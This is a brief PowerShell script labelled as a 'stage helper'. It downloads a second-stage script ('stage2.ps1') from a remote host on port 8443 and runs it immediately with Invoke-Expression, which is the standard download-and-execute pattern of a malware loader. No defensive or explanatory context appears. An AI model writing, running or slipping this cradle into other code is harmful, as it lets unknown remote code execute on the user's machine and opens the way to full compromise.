# Stage helper
$Stage2Url = "https://adatum.com:8443/stage2.ps1"
Invoke-Expression (New-Object System.Net.WebClient).DownloadString($Stage2Url)
$StageMarker = "stage-28"
